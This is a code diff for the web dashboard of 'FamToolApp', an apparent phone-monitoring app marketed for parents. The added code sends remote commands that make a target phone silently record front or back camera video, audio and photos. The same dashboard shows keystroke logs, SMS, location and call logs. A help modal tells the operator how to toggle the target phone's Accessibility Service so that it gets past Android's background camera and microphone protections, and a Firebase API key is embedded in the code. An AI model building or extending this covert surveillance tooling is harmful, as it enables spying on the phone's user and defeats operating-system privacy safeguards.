@@ -156,9 +156,7 @@
         .main-header-left { display: flex; align-items: center; gap: 1.5rem; }
         .main-header h1 { font-size: 2.5rem; color: #fff; font-weight: 700; }
         
-        /* ===== START: CODE CHANGE / कोड में बदलाव यहाँ से शुरू ===== */
         .header-actions { display: flex; gap: 1rem; }
-        /* ===== END: CODE CHANGE / कोड में बदलाव यहाँ समाप्त ===== */
 
         .header-btn {
             background: var(--secondary-surface); border: 1px solid var(--border-color);
@@ -176,15 +174,31 @@
         .action-btn {
             background: var(--secondary-surface); color: white; padding: 12px 20px; border: 1px solid var(--border-color);
             border-radius: 10px; cursor: pointer; font-size: 1rem; font-weight: 600; transition: all 0.3s ease;
+            position: relative; 
+            overflow: hidden; 
         }
         #logout-btn { background: var(--accent-teal); }
         #logout-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(0, 169, 165, 0.3); }
 
-        /* ===== START: CODE CHANGE / कोड में बदलाव यहाँ से शुरू ===== */
         #delete-account-btn { background: var(--accent-red); border-color: var(--accent-red); }
         #delete-account-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(244, 67, 54, 0.3); }
-        /* ===== END: CODE CHANGE / कोड में बदलाव यहाँ समाप्त ===== */
 
+        /* हिंदी कमेंट: यह नया स्टाइल जानकारी (i) बटन के लिए है। */
+        .info-btn {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .info-btn:hover {
+            background: var(--accent-blue);
+            color: var(--bg-main);
+            border-color: var(--accent-blue);
+        }
 
         #details-view { display: none; animation: fadeIn 0.8s ease; }
         .category-buttons {
@@ -215,6 +229,28 @@
         }
         .category-btn > * { position: relative; z-index: 1; }
         .category-btn svg { width: 32px; height: 32px; transition: all 0.3s ease; }
+        
+        .action-btn.counting-down::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            background: rgba(138, 43, 226, 0.5);
+            animation: countdown-animation 30s linear forwards;
+            z-index: 2;
+        }
+        .action-btn > span {
+            position: relative;
+            z-index: 3;
+        }
+
+        @keyframes countdown-animation {
+            from { width: 100%; }
+            to { width: 0%; }
+        }
+
         .category-btn[data-category="coming-soon"] {
             background: repeating-linear-gradient(45deg, var(--secondary-surface), var(--secondary-surface) 10px, rgba(30, 42, 69, 0.8) 10px, rgba(30, 42, 69, 0.8) 20px);
             color: var(--text-secondary);
@@ -290,7 +326,6 @@
         .modal-close-btn { background: none; border: none; font-size: 28px; cursor: pointer; color: var(--text-primary); transition: all 0.3s ease; }
         .modal-close-btn:hover { color: var(--accent-teal); }
 
-        /* ===== START: CODE CHANGE / कोड में बदलाव यहाँ से शुरू ===== */
         .modal-footer {
             margin-top: 1.5rem;
             padding-top: 1.5rem;
@@ -325,7 +360,6 @@
             box-shadow: 0 4px 15px rgba(244, 67, 54, 0.4);
             transform: translateY(-2px);
         }
-        /* ===== END: CODE CHANGE / कोड में बदलाव यहाँ समाप्त ===== */
 
         .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; }
         .data-list { display: flex; flex-direction: column; gap: 1.5rem; }
@@ -409,15 +443,12 @@
             transition: width 0.5s ease;
         }
 
-
-        .data-header { display: flex; justify-content: flex-end; align-items: center; margin-bottom: 1.5rem; padding-bottom: 1.5rem; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; gap: 1rem; }
-        .capture-photo-btn, #refresh-photos-btn {
-            color: #fff; padding: 10px 16px; border: 1px solid var(--border-color); border-radius: 8px;
-            cursor: pointer; font-size: 0.9rem; font-weight: 500; display: inline-flex;
-            align-items: center; gap: 8px; transition: all 0.3s ease; background: var(--secondary-surface);
+        .data-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; padding-bottom: 1.5rem; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; gap: 1rem; }
+        .limit-display {
+            font-size: 1rem;
+            color: var(--accent-blue);
+            font-weight: 500;
         }
-        .capture-photo-btn:hover { background: var(--accent-green); border-color: var(--accent-green); }
-        #refresh-photos-btn:hover { background: var(--accent-teal); border-color: var(--accent-teal); }
         
         .ok-btn, .home-btn {
             background: linear-gradient(45deg, var(--accent-teal), var(--accent-purple));
@@ -511,6 +542,13 @@
             .modal-body {
                 padding: 0 0.25rem 0.5rem 0.25rem;
             }
+            .data-header {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .limit-display {
+                text-align: center;
+            }
         }
         @media (max-width: 420px) {
             .page-footer {
@@ -574,8 +612,8 @@
                     <h1 id="main-content-title">Select Child</h1>
                 </div>
                 <div class="header-actions">
-                    <button id="logout-btn" class="action-btn">Logout</button>
-                    <button id="delete-account-btn" class="action-btn">Delete Account</button>
+                    <button id="logout-btn" class="action-btn"><span>Logout</span></button>
+                    <button id="delete-account-btn" class="action-btn"><span>Delete Account</span></button>
                 </div>
                 </header>
 
@@ -593,6 +631,14 @@
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
                         <span>Photos</span>
                     </button>
+                    <button class="category-btn" data-category="video">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff7043" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>
+                        <span>Videos</span>
+                    </button>
+                    <button class="category-btn" data-category="audio">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#26a69a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
+                        <span>Audio Recordings</span>
+                    </button>
                     <button class="category-btn" data-category="keylogger">
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#ffab40" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
                         <span>Keystroke</span>
@@ -609,10 +655,6 @@
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent-pink)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                         <span>Notifications</span>
                     </button>
-                    <button class="category-btn" data-category="coming-soon" data-feature-name="Screen Review">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="15" rx="2" ry="2"></rect><polyline points="17 2 12 7 7 2"></polyline></svg>
-                        <span>Screen Review</span>
-                    </button>
                      <button class="category-btn" data-category="coming-soon" data-feature-name="Screenshot">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.09 10.59a2.23 2.23 0 0 0-2.2-2.2H5.12a2.23 2.23 0 0 0-2.2 2.2v8.84a2.23 2.23 0 0 0 2.2 2.2h13.78a2.23 2.23 0 0 0 2.2-2.2v-8.84zM6.88 4.71h10.24"></path><line x1="12" y1="2.11" x2="12" y2="4.71"></line></svg>
                         <span>Screenshot</span>
@@ -620,10 +662,6 @@
                     <button class="category-btn" data-category="coming-soon" data-feature-name="File Manager">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
                         <span>File Manager</span>
-                    </button>
-                    <button class="category-btn" data-category="coming-soon" data-feature-name="Voice Review">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
-                        <span>Voice Review</span>
                     </button>
                  </div>
             </div>
@@ -739,19 +777,44 @@
             </div>
         </div>
     </div>
+
+    <div id="info-accessibility-modal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 600px;">
+            <div class="modal-header">
+                <h3>Hardware Permission Information</h3>
+                <button class="modal-close-btn">×</button>
+            </div>
+            <div class="modal-body">
+                <h4 style="color: var(--accent-blue); margin-bottom: 1rem;">Why might the command not work?</h4>
+                <p style="margin-bottom: 1.5rem; line-height: 1.6;">
+                    Sometimes, new Android versions block hardware permissions (like camera or microphone) for apps running in the background for security reasons. Even after giving permission during setup, the system might stop it later.
+                </p>
+                <h4 style="color: var(--accent-blue); margin-bottom: 1rem;">How to fix this?</h4>
+                <p style="line-height: 1.6;">
+                    To solve this, you need to reset the app's most powerful permission: the Accessibility Service.
+                    <br><br>
+                    1. Go to your child's phone **Settings &rarr; Accessibility &rarr; Installed/Downloaded Apps**.
+                    <br>
+                    2. Find **"FamToolApp"** or **"Child Accessibility Service"**.
+                    <br>
+                    3. If it's **ON**, please turn it **OFF** and then turn it **ON** again. If it's already **OFF**, just turn it **ON**.
+                </p>
+                <p style="margin-top: 1.5rem; line-height: 1.6;">
+                    This will refresh the permissions, and the recording commands should work correctly.
+                </p>
+            </div>
+        </div>
+    </div>
     
     <footer class="page-footer">
         © Copyright FamToolApp. All Rights Reserved by FamToolApp
     </footer>
 
     <script type="module">
-        // ===== START: CODE CHANGE / कोड में बदलाव यहाँ से शुरू =====
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
         import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, sendPasswordResetEmail, sendEmailVerification, deleteUser } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
-        import { getDatabase, ref, onValue, remove, update, query, orderByChild, equalTo, push, serverTimestamp, off } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
-        import { getStorage } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
-        // ===== END: CODE CHANGE / कोड में बदलाव यहाँ समाप्त =====
-
+        import { getDatabase, ref, onValue, set, get, update, query, orderByChild, equalTo, push, serverTimestamp, off } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+        
         const firebaseConfig = {
           apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
           authDomain: "home-demo12-d5814.firebaseapp.com",
@@ -766,8 +829,8 @@
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getDatabase(app);
-        const storage = getStorage(app);
 
+        // ... (DOM Element variables remain the same)
         const authContainer = document.getElementById('auth-container');
         const dashboard = document.getElementById('dashboard');
         const userList = document.getElementById('user-list');
@@ -800,13 +863,13 @@
         const toggleSidebarBtn = document.getElementById('toggle-sidebar-btn');
         const infoNotificationModal = document.getElementById('info-notification-modal');
         const infoModalText = document.getElementById('info-modal-text');
-
-        // ===== START: CODE CHANGE / कोड में बदलाव यहाँ से शुरू =====
         const deleteAccountBtn = document.getElementById('delete-account-btn');
         const deleteAccountModal = document.getElementById('delete-account-modal');
         const confirmDeleteBtn = document.getElementById('confirm-delete-btn');
         const cancelDeleteBtn = document.getElementById('cancel-delete-btn');
-        // ===== END: CODE CHANGE / कोड में बदलाव यहाँ समाप्त =====
+        // हिंदी कमेंट: एक्सेसिबिलिटी जानकारी वाले नए मॉडल का वेरिएबल।
+        const infoAccessibilityModal = document.getElementById('info-accessibility-modal');
+
 
         let authMode = 'login';
         let activeDataListener = null;
@@ -819,6 +882,11 @@
         let renderedKeyloggerCount = 0;
         const KEYLOGGER_BATCH_SIZE = 50;
         let isKeyloggerLoading = false;
+        
+        // हिंदी कमेंट: ये फ्लैग्स सुनिश्चित करते हैं कि कमांड दो बार न भेजे जाएँ।
+        let isPhotoCommandRunning = false;
+        let isVideoCommandRunning = false;
+        let isAudioCommandRunning = false;
         
         toggleSidebarBtn.addEventListener('click', () => dashboard.classList.toggle('sidebar-hidden'));
         
@@ -864,9 +932,7 @@
                     .then((userCredential) => {
                         sendEmailVerification(auth.currentUser)
                             .then(() => {
-                                // ===== START: CODE CHANGE / कोड में बदलाव यहाँ से शुरू =====
                                 openModal(signupSuccessModal);
-                                // ===== END: CODE CHANGE / कोड में बदलाव यहाँ समाप्त =====
                                 signOut(auth);
                             });
                     })
@@ -921,7 +987,6 @@
             }
         });
 
-        // ===== START: CODE CHANGE / कोड में बदलाव यहाँ से शुरू =====
         deleteAccountBtn.addEventListener('click', () => {
             openModal(deleteAccountModal);
         });
@@ -936,10 +1001,8 @@
                 deleteUser(user).then(() => {
                     closeModal(deleteAccountModal);
                     showToast('Account deleted successfully.');
-                    // onAuthStateChanged will handle UI switch to login screen
                 }).catch((error) => {
                     console.error("Error deleting user:", error);
-                    // Handle common error: user needs to re-authenticate
                     if (error.code === 'auth/requires-recent-login') {
                         showToast('This is a sensitive operation. Please log out and log back in again before deleting your account.');
                     } else {
@@ -949,7 +1012,6 @@
                 });
             }
         });
-        // ===== END: CODE CHANGE / कोड में बदलाव यहाँ समाप्त =====
 
         function loadUserDevices(userId) {
             const usersRef = ref(db, `user/${userId}`);
@@ -971,10 +1033,87 @@
                 document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active')); listItem.classList.add('active');
                 selectedChildInfo = { userId: listItem.dataset.userid, childKey: listItem.dataset.childkey, userName: listItem.dataset.username, deviceName: listItem.dataset.devicename };
                 mainContentTitle.textContent = `${selectedChildInfo.userName}`; detailsView.style.display = 'block'; liveChatBtn.disabled = false;
+                
                 setupNotificationListener(selectedChildInfo.userId, selectedChildInfo.childKey);
+
                 if (window.innerWidth <= 992) { sidebar.classList.remove('open'); overlay.style.display = 'none'; }
             }
         });
+
+        // हिंदी कमेंट: इस फंक्शन को अपडेट किया गया है ताकि यह कमांड फ्लैग को भी रीसेट करे।
+        function startCountdown(button, durationInSeconds = 30, category = null) {
+            button.disabled = true;
+            button.classList.add('counting-down');
+            const span = button.querySelector('span');
+            const originalText = span.textContent;
+            
+            let secondsRemaining = durationInSeconds;
+            span.textContent = `${secondsRemaining}s...`;
+
+            const interval = setInterval(() => {
+                secondsRemaining--;
+                span.textContent = `${secondsRemaining}s...`;
+                if (secondsRemaining <= 0) {
+                    clearInterval(interval);
+                    span.textContent = originalText;
+                    button.disabled = false;
+                    button.classList.remove('counting-down');
+                    // हिंदी कमेंट: काउंटडाउन खत्म होने पर संबंधित कमांड फ्लैग को false पर सेट करें।
+                    if (category === 'video') isVideoCommandRunning = false;
+                    if (category === 'audio') isAudioCommandRunning = false;
+                }
+            }, 1000);
+        }
+        
+        function incrementUsageCount(category, currentLimitInfo) {
+            const { userId, childKey } = selectedChildInfo;
+            if (!userId || !childKey) return;
+
+            const today = new Date().toISOString().slice(0, 10);
+            
+            const updates = {};
+            if (currentLimitInfo.date !== today) {
+                updates[`user/${userId}/${childKey}/limits/${category}/usage`] = 1;
+                updates[`user/${userId}/${childKey}/limits/${category}/date`] = today;
+            } else {
+                const newUsage = (currentLimitInfo.usage || 0) + 1;
+                updates[`user/${userId}/${childKey}/limits/${category}/usage`] = newUsage;
+            }
+            update(ref(db), updates);
+        }
+        
+        function sendCommand(button, path, value, category, currentLimitInfo) {
+            const span = button.querySelector('span');
+            const originalText = span.textContent;
+            button.disabled = true;
+            span.textContent = 'Sending...';
+
+            set(ref(db, path), value)
+                .then(() => {
+                    span.textContent = 'Command Sent!';
+                    if (category) {
+                        incrementUsageCount(category, currentLimitInfo);
+                        startCountdown(button, 30, category); // हिंदी कमेंट: फ्लैग रीसेट के लिए कैटेगरी पास करें
+                    } else {
+                        setTimeout(() => {
+                            span.textContent = originalText;
+                            button.disabled = false;
+                            if (path.includes('/photo/')) {
+                                isPhotoCommandRunning = false;
+                            }
+                        }, 3000);
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error sending command: ", error);
+                    showToast(`Failed to send command: ${error.message}`);
+                    span.textContent = originalText;
+                    button.disabled = false;
+                    if (path.includes('/photo/')) isPhotoCommandRunning = false;
+                    if (path.includes('/video/')) isVideoCommandRunning = false;
+                    if (path.includes('/audio/')) isAudioCommandRunning = false;
+                });
+        }
 
         categoryButtonsContainer.addEventListener('click', (e) => {
             const button = e.target.closest('.category-btn');
@@ -986,17 +1125,34 @@
         
         function getSafeCategoryName(category) {
             const nameMap = {
-                'keylogger': 'Keystroke', 'location': 'Location', 'photo': 'Photos', 'sms': 'SMS', 'notifications': 'Notifications', 'devicestatus': 'Device Status', 'calllogs': 'Call Logs'
+                'keylogger': 'Keystroke', 'location': 'Location', 'photo': 'Photos', 'sms': 'SMS', 'notifications': 'Notifications', 'devicestatus': 'Device Status', 'calllogs': 'Call Logs',
+                'video': 'Videos', 'audio': 'Audio Recordings'
             };
             return nameMap[category] || category.charAt(0).toUpperCase() + category.slice(1);
         }
 
         function displayCategoryData(category) {
             if (activeDataListener) off(activeDataListener.ref);
-            modalDataDisplayArea.innerHTML = '<div class="loader"></div>'; const { userId, childKey } = selectedChildInfo;
-            if (!userId || !childKey) { modalDataDisplayArea.innerHTML = '<p>Please select a device first.</p>'; return; }
+            modalDataDisplayArea.innerHTML = '<div class="loader"></div>'; 
+            const { userId, childKey } = selectedChildInfo;
+            if (!userId || !childKey) { 
+                modalDataDisplayArea.innerHTML = '<p>Please select a device first.</p>'; 
+                return; 
+            }
             
-            if (category === 'photo') { renderPhotosFromDatabase(userId, childKey); return; }
+            // हिंदी कमेंट: फोटो, वीडियो, और ऑडियो के लिए अब get() की जगह onValue() का इस्तेमाल होगा ताकि डेटा रियल-टाइम में अपडेट हो।
+            if (category === 'photo') {
+                renderPhotosFromDatabase(userId, childKey); 
+                return; 
+            }
+            if (category === 'video') {
+                renderVideosFromDatabase(userId, childKey);
+                return;
+            }
+            if (category === 'audio') {
+                renderAudiosFromDatabase(userId, childKey);
+                return;
+            }
 
             const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`; const dataRef = ref(db, dataPath); activeDataListener = { ref: dataRef };
             
@@ -1069,7 +1225,7 @@
             switch(category) {
                 case 'location':
                     const loc = data; let mapLink = '';
-                    if (loc.latitude && loc.longitude) { mapLink = `<a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;}
+                    if (loc.latitude && loc.longitude) { mapLink = `<a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;}
                     contentHTML = `<div class="data-card location-card"><div class="data-card-body"><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-9-6-9-13a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg><div><strong>Address:</strong><br>${loc.address || 'N/A'}</div></div><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div><strong>Time:</strong><br>${loc.dateTime || 'N/A'}</div></div>${mapLink}</div></div>`;
                     break;
                 case 'sms':
@@ -1105,40 +1261,167 @@
             modalDataDisplayArea.innerHTML = contentHTML;
         }
 
+        // हिंदी कमेंट: बग फिक्स - अब यह फंक्शन get() के बजाय onValue() का उपयोग करता है।
         function renderPhotosFromDatabase(userId, childKey) {
-            const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="1"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="0"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button></div>`;
-            modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
+            const headerHTML = `<div class="data-header">
+                <div class="header-actions">
+                    <button class="action-btn" data-command="capturePhoto" data-facing="1" style="background: var(--accent-green);"><span>Capture Front Photo</span></button>
+                    <button class="action-btn" data-command="capturePhoto" data-facing="0" style="background: var(--accent-green);"><span>Capture Back Photo</span></button>
+                    <button class="action-btn" data-command="refresh" data-category="photo"><span>Refresh</span></button>
+                </div>
+            </div>`;
+            modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader" id="loader-placeholder"></div>';
             
             const photoDataRef = ref(db, `user/${userId}/${childKey}/photo/data`);
-            const callback = (snapshot) => {
-                const photos = snapshot.val();
-                if (!photos || Object.keys(photos).length === 0) {
-                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>';
-                    return;
-                }
-                const photosWithData = Object.values(photos).reverse();
-                let photoGridHTML = '<div class="data-grid">';
-                photosWithData.forEach(photoData => {
-                    if (typeof photoData === 'object' && photoData !== null && photoData.urlPhoto) {
-                        const url = photoData.urlPhoto; 
-                        const timeCreated = photoData.dateTime || 'N/A';
-                        photoGridHTML += `<div class="data-card photo-card"><img src="${url}" alt="Captured photo" style="width:100%; height: 200px; object-fit: cover; border-radius: 8px 8px 0 0;" onerror="this.onerror=null;this.src='https://placehold.co/300x200/162136/E0E7FF?text=Error';"><div style="padding: 1rem;"><div class="data-card-footer" style="text-align: left;">${timeCreated}</div><a href="${url}" target="_blank" class="map-link" style="width: 100%; justify-content: center;">View Full Image</a></div></div>`;
-                    }
-                });
-                photoGridHTML += '</div>';
-                modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
-            };
             
-            if (activeDataListener) {
-                off(activeDataListener.ref, 'value', activeDataListener.callback);
-            }
-            onValue(photoDataRef, callback);
-            activeDataListener = { ref: photoDataRef, callback: callback };
+            if (activeDataListener) off(activeDataListener.ref);
+            activeDataListener = { ref: photoDataRef };
+            
+            onValue(photoDataRef, (snapshot) => {
+                const photos = snapshot.val();
+                let photoGridHTML = '';
+                if (!photos || Object.keys(photos).length === 0) {
+                    photoGridHTML = '<p>No photos available.</p>';
+                } else {
+                    const photosWithData = Object.values(photos).reverse();
+                    photoGridHTML = '<div class="data-grid">';
+                    photosWithData.forEach(photoData => {
+                        if (typeof photoData === 'object' && photoData !== null && photoData.urlPhoto) {
+                            const url = photoData.urlPhoto; 
+                            const timeCreated = photoData.dateTime || 'N/A';
+                            photoGridHTML += `<div class="data-card photo-card"><img src="${url}" alt="Captured photo" style="width:100%; height: 200px; object-fit: cover; border-radius: 8px 8px 0 0;" onerror="this.onerror=null;this.src='https://placehold.co/300x200/162136/E0E7FF?text=Error';"><div style="padding: 1rem;"><div class="data-card-footer" style="text-align: left;">${timeCreated}</div><a href="${url}" target="_blank" class="map-link" style="width: 100%; justify-content: center;">View Full Image</a></div></div>`;
+                        }
+                    });
+                    photoGridHTML += '</div>';
+                }
+                document.getElementById('modal-data-display-area').innerHTML = headerHTML + photoGridHTML;
+            });
         }
         
+        // हिंदी कमेंट: बग फिक्स - अब यह फंक्शन get() के बजाय onValue() का उपयोग करता है। इसमें नया जानकारी (i) बटन भी जोड़ा गया है।
+        function renderVideosFromDatabase(userId, childKey) {
+            get(ref(db, `user/${userId}/${childKey}/limits/video`)).then(snapshot => {
+                const videoLimitData = snapshot.val() || { count: 4, usage: 0, date: '1970-01-01' };
+                const today = new Date().toISOString().slice(0, 10);
+                const limit = videoLimitData.count;
+                const used = videoLimitData.date === today ? videoLimitData.usage : 0;
+                const remaining = limit - used;
+
+                const headerHTML = `<div class="data-header">
+                    <p class="limit-display">Remaining attempts for today: ${remaining}/${limit}</p>
+                    <div class="header-actions">
+                        <button class="info-btn" data-command="show-info">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                        </button>
+                        <button class="action-btn" data-command="recordVideo" data-facing="1" style="background: var(--accent-green);"><span>Record Front Video (30s)</span></button>
+                        <button class="action-btn" data-command="recordVideo" data-facing="0" style="background: var(--accent-green);"><span>Record Back Video (30s)</span></button>
+                        <button class="action-btn" data-command="refresh" data-category="video"><span>Refresh</span></button>
+                    </div>
+                </div>`;
+                modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader" id="loader-placeholder"></div>';
+                
+                const videoDataRef = ref(db, `user/${userId}/${childKey}/video/data`);
+                if (activeDataListener) off(activeDataListener.ref);
+                activeDataListener = { ref: videoDataRef };
+                
+                onValue(videoDataRef, (videoSnapshot) => {
+                    const videos = videoSnapshot.val();
+                    let videoGridHTML = '';
+                    if (!videos || Object.keys(videos).length === 0) {
+                        videoGridHTML = '<p>No videos available.</p>';
+                    } else {
+                        const videosWithData = Object.values(videos).reverse();
+                        videoGridHTML = '<div class="data-grid">';
+                        videosWithData.forEach(videoData => {
+                            if (typeof videoData === 'object' && videoData !== null && videoData.videoUrl) {
+                                const url = videoData.videoUrl; 
+                                const timeCreated = videoData.dateTime || 'N/A';
+                                videoGridHTML += `<div class="data-card video-card">
+                                    <video controls style="width:100%; border-radius: 8px 8px 0 0;" preload="metadata">
+                                        <source src="${url}" type="video/mp4">
+                                        Your browser does not support the video tag.
+                                    </video>
+                                    <div style="padding: 1rem;">
+                                        <div class="data-card-footer" style="text-align: left;">${timeCreated}</div>
+                                        <a href="${url}" target="_blank" class="map-link" style="width: 100%; justify-content: center;">View Full Video</a>
+                                    </div>
+                                </div>`;
+                            }
+                        });
+                        videoGridHTML += '</div>';
+                    }
+                    document.getElementById('modal-data-display-area').innerHTML = headerHTML + videoGridHTML;
+                });
+            });
+        }
+
+        // हिंदी कमेंट: बग फिक्स - अब यह फंक्शन get() के बजाय onValue() का उपयोग करता है। इसमें नया जानकारी (i) बटन भी जोड़ा गया है।
+        function renderAudiosFromDatabase(userId, childKey) {
+            get(ref(db, `user/${userId}/${childKey}/limits/audio`)).then(snapshot => {
+                const audioLimitData = snapshot.val() || { count: 5, usage: 0, date: '1970-01-01' };
+                const today = new Date().toISOString().slice(0, 10);
+                const limit = audioLimitData.count;
+                const used = audioLimitData.date === today ? audioLimitData.usage : 0;
+                const remaining = limit - used;
+                
+                const headerHTML = `<div class="data-header">
+                    <p class="limit-display">Remaining attempts for today: ${remaining}/${limit}</p>
+                     <div class="header-actions">
+                        <button class="info-btn" data-command="show-info">
+                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                        </button>
+                        <button class="action-btn" data-command="recordAudio" style="background: var(--accent-green);"><span>Record Audio (30s)</span></button>
+                        <button class="action-btn" data-command="refresh" data-category="audio"><span>Refresh</span></button>
+                    </div>
+                </div>`;
+                modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
+                
+                const audioDataRef = ref(db, `user/${userId}/${childKey}/audio/data`);
+                if (activeDataListener) off(activeDataListener.ref);
+                activeDataListener = { ref: audioDataRef };
+
+                onValue(audioDataRef, (audioSnapshot) => {
+                    const audios = audioSnapshot.val();
+                    let audioListHTML = '';
+                    if (!audios || Object.keys(audios).length === 0) {
+                        audioListHTML = '<p>No audio recordings available.</p>';
+                    } else {
+                        const audiosWithData = Object.values(audios).reverse();
+                        audioListHTML = '<div class="data-list">';
+                        audiosWithData.forEach(audioData => {
+                            if (typeof audioData === 'object' && audioData !== null && audioData.audioUrl) {
+                                const url = audioData.audioUrl; 
+                                const timeCreated = audioData.dateTime || 'N/A';
+                                audioListHTML += `<div class="data-card audio-card">
+                                    <div class="data-card-body">
+                                         <audio controls style="width:100%;" preload="metadata">
+                                            <source src="${url}" type="audio/mpeg">
+                                            Your browser does not support the audio element.
+                                        </audio>
+                                    </div>
+                                    <div class="data-card-footer">${timeCreated}</div>
+                                </div>`;
+                            }
+                        });
+                        audioListHTML += '</div>';
+                    }
+                    document.getElementById('modal-data-display-area').innerHTML = headerHTML + audioListHTML;
+                });
+            });
+        }
+
         function getCategoryPath(category) {
             switch (category) {
